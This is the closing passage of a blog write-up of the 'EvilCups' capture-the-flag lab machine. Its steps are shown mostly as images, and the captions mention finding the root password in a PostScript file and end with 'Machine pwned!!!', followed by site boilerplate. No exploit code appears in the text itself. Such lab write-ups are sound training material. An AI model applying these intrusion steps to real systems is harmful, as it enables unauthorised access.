<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_10.png" alt="image.png" />
<br /><br />
And find the password for the root user
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_11.png" alt="image.png" />
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_12.png" alt="image.png" />
<br /><br />
Note that it is a PostScript document, we can copy it 
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_13.png" alt="image.png" />
<br /><br />
And visualize it as a .pdf file
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_14.png" alt="image.png" />
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_15.png" alt="image.png" />
<br /><br />
Machine pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7.html';
     this.page.identifier = '/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7';
     this.page.title = 'EvilCups-Medium-LInux';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/08/09/dddc540b-b15a-4ca6-a4e5-f95074025ea8-export-c6a747d0-44c2-4f1a-b1f3-cc9f14194be4.html">
            University-Windows-Insane
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/08/04/d2fd2792-68e0-4168-9904-f90f3bf63609-export-0ee8c1a5-de29-43f8-b0f4-339fa55d28de.html">
            Code-Linux-Easy
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/26/e76d8ea2-ffc7-429a-835f-9f3b0344d1ab-export-d6a1d454-c23f-4600-bcb8-77c5a1ed5947.html">
            Cypher-Linux-Medium
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
